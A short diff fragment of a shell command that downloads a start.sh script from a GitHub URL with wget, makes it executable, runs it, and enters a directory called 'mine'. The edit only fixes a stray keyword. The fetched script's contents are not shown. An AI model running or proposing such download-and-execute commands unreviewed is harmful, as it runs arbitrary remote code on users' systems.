@@ -1,5 +1,4 @@
-/bin/bash -c "
-do wget -O start.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start.sh; 
+/bin/bash -c "wget -O start.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start.sh; 
 chmod u+x start.sh ;
 ./start.sh ; 
 cd mine; 
